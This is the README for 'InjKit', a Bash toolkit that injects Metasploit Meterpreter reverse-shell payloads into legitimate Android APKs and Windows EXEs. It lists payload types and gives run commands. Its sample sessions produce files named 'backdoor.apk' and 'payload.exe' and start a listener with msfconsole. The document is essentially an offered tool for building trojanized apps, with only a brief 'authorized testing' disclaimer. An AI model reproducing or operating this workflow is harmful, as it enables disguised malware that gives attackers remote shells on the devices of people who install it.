# InjKit

Payload Injector Toolkit (APK & EXE)

InjKit is a lightweight Bash-based toolkit for injecting Metasploit Meterpreter reverse shell payloads into clean Android APK files or Windows EXE binaries using msfvenom.

It consists of two interactive scripts:

apk_injector.sh → injects payloads into APK files (Android).

exe_injector.sh → injects payloads into EXE files (Windows).


Both scripts:

Validate LHOST and LPORT.

Let you choose payload type (TCP, HTTP, HTTPS).

Verify file paths before injection.

Automatically generate a Metasploit listener script (listener.r).



---

📁 Included Scripts

1. apk_injector.sh — Android APK Injector

Injects a reverse shell payload into a clean APK.

🔧 Features:

Interactive prompts for LHOST, LPORT, payload selection.

Validates APK path and output filename.

Supports payloads:

android/meterpreter/reverse_tcp

android/meterpreter/reverse_http

android/meterpreter/reverse_https


Generates new APK with embedded payload.

Creates listener.r for Metasploit.



---

2. exe_injector.sh — Windows EXE Injector

Injects a reverse shell payload into a clean EXE.

🔧 Features:

Interactive prompts for LHOST, LPORT, payload type.

Detects EXE architecture automatically (x86 or x64).

Supports payloads:

windows/meterpreter/reverse_{tcp,http,https}

windows/x64/meterpreter/reverse_{tcp,http,https}


Validates EXE path and output filename.

Generates new EXE with embedded payload.

Creates listener.r for Metasploit.



---

🚀 Example Usage

APK Injector

chmod +x apk_injector.sh
./apk_injector.sh

🖥️ Sample Interaction:

===============================
        APK Payload Injector
===============================

🌐 Enter LHOST: 192.168.1.100
🎯 Enter LPORT: 4444
Select Payload Type:
1) android/meterpreter/reverse_tcp
2) android/meterpreter/reverse_http
3) android/meterpreter/reverse_https
Enter the path to a clean APK file: /root/app.apk
Enter the output file name (e.g., evil.apk): backdoor.apk

[*] Injecting payload into /root/app.apk...
[+] Payload injected successfully! Saved as: backdoor.apk
[+] Metasploit listener script saved as: listener.r
[*] You can run it using: msfconsole -r listener.r


---

EXE Injector

chmod +x exe_injector.sh
./exe_injector.sh

🖥️ Sample Interaction:

===============================
      EXE Payload Injector
===============================

🌐 Enter LHOST: 192.168.1.100
🎯 Enter LPORT: 5555
Enter the path to a clean EXE file (e.g., notepad.exe): /root/notepad.exe

=========================================
✅ Architecture detected: x64
=========================================

Select Payload Type (x64):
1) windows/x64/meterpreter/reverse_tcp
2) windows/x64/meterpreter/reverse_http
3) windows/x64/meterpreter/reverse_https
Enter choice [1-3]: 1

Enter the output file name (e.g., evil.exe): payload.exe

[*] Injecting payload (windows/x64/meterpreter/reverse_tcp) into /root/notepad.exe...
[+] Payload injected successfully! Saved as: payload.exe
[+] Metasploit listener script saved as: listener.r
[*] You can run it using: msfconsole -r listener.r


---

🎯 Listener Script (listener.r)

Each injection generates a listener.r file with the required commands for Metasploit:

msfconsole -r listener.r

This automatically starts the handler for the chosen payload.


---

⚠️ Notes

Requires Metasploit Framework installed (msfvenom, msfconsole).

Works on Linux systems (tested on Kali).

For educational and authorized penetration testing only.



---

💬 Feedback

Contributions, improvements, or suggestions are welcome.
Made for learning, red teaming, and ethical hacking.


---
